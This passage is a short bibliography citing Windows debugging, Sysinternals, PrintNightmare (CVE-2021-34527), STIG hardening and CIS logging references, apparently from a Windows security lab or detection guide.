10. Microsoft Learn. "WinDBG and Kernel Debugging." <https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/>
11. Russinovich, M. *Sysinternals Suite Reference.* Microsoft Press, 2020. — Process Explorer, Process Monitor, Autoruns, and PsExec reference.
12. National Vulnerability Database. CVE-2021-34527. "PrintNightmare." <https://nvd.nist.gov/vuln/detail/CVE-2021-34527> — Relevant Print Spooler exploitation lab scenario.
13. DISA. "Windows 10 STIG — C2 Detection and Hardening." <https://www.stigviewer.com/stig/windows_10/> — PowerShell logging, script block logging, and AMSI enforcement.
14. CIS. "Microsoft Windows 11 Benchmark — Logging and Monitoring." *Center for Internet Security*, 2023. — ETW configuration, Defender for Endpoint onboarding, and C2 detection.